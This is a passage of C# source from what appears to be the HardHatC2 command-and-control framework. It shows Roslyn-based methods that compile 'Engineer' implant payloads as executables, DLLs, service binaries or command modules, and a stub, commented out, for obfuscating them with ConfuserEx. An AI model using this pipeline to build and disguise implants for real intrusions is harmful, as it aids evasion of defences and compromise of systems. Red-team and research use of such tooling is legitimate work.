                MetadataReference assemblyRefrence = MetadataReference.CreateFromFile(assembly);
                references.Add(assemblyRefrence);
            }
            
            OutputKind outputKind = OutputKind.ConsoleApplication;
            if(compileType == SpawnEngineerRequest.EngCompileType.exe)
            {
                outputKind = OutputKind.ConsoleApplication;
            }
            else if(compileType == SpawnEngineerRequest.EngCompileType.dll)
            {
                outputKind = OutputKind.DynamicallyLinkedLibrary;
            }
            else if(compileType == SpawnEngineerRequest.EngCompileType.serviceexe)
            {
                outputKind = OutputKind.WindowsApplication;
            }
            else
            {
                outputKind = OutputKind.ConsoleApplication;
            }

            CSharpCompilation compilation = CSharpCompilation.Create(assemblyName, syntaxTrees: trees,
                references: references,
                options: new CSharpCompilationOptions(outputKind: outputKind, optimizationLevel: OptimizationLevel.Release, platform: Platform.X64, allowUnsafe: true));
            
            using (var ms = new MemoryStream())
            {
                EmitResult result = compilation.Emit(ms);

                if (!result.Success)
                {
                    IEnumerable<Diagnostic> failures = result.Diagnostics.Where(diagnostic =>
                        diagnostic.IsWarningAsError ||
                        diagnostic.Severity == DiagnosticSeverity.Error);
                    Console.WriteLine(" Roslyn Compilation failed");
                    foreach (Diagnostic diagnostic in failures)
                    {
                        Console.Error.WriteLine("{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
                    }
                    return null;
                }
                else
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] assemblyBytes = ms.ToArray();
                    return assemblyBytes;
                }
            }
        }

        public static byte[] CompileCommands(string source)
        {
            string assemblyName = Path.GetRandomFileName();
            SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(source);
            
            char allPlatformPathSeperator = Path.DirectorySeparatorChar;
            string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path
            pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
            pathSplit[1] = pathSplit[1].Replace("\\", allPlatformPathSeperator.ToString());
            string dataFolderPath = pathSplit[0] + "Data";

            //return the filenames from the dataFolderPath directory
            string[] assemblyRefList = Directory.GetFiles(dataFolderPath);
            
            //get Refrences from the assembly
            List<MetadataReference> references = new List<MetadataReference> { };
            foreach (string assembly in assemblyRefList)
            {
                MetadataReference assemblyRefrence = MetadataReference.CreateFromFile(assembly);
                references.Add(assemblyRefrence);
            }
            
            
            //use the roslyn compiler to read the source code
            CSharpCompilation compilation = CSharpCompilation.Create(assemblyName, syntaxTrees: new[] { syntaxTree }, references:references,
                options: new CSharpCompilationOptions(outputKind: OutputKind.NetModule, optimizationLevel: OptimizationLevel.Release, platform: Platform.X64, allowUnsafe: true));
            
            using (var ms = new MemoryStream())
            {
                EmitResult result = compilation.Emit(ms);
            
                // if (!result.Success)
                // {
                //     IEnumerable<Diagnostic> failures = result.Diagnostics.Where(diagnostic =>
                //         diagnostic.IsWarningAsError ||
                //         diagnostic.Severity == DiagnosticSeverity.Error);
                //     Console.WriteLine(" Roslyn Compilation failed");
                //     foreach (Diagnostic diagnostic in failures)
                //     {
                //         Console.Error.WriteLine("{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
                //     }
                //     return null;
                // }
                // else
                // {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] assemblyBytes = ms.ToArray();
                    return assemblyBytes;
                //}
            }
        }


        // spawn a new process running D:\Share between vms\ConfuserEx-CLI\Confuser.CLI.Exe , pass in the file location we compiled 
        public static void RunConfuser(string fileLocation)
        {
            // get the base directory of the project
            char allPlatformPathSeperator = Path.DirectorySeparatorChar;
            string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path 
            pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
            pathSplit[1] = pathSplit[1].Replace("\\", allPlatformPathSeperator.ToString());

            // get the path to HardHatC2\Engineer\Engineer.crproj
            string projectPath = pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Engineer.crproj";

           // Process P = new Process();
           // P.StartInfo.FileName =
            // P.StartInfo.Arguments = $"\"{projectPath}\" \"-n\"";
           // P.StartInfo.ArgumentList.Add($"{projectPath}");
          //  P.StartInfo.ArgumentList.Add("-n");
           // P.Start();
        }
    }
}
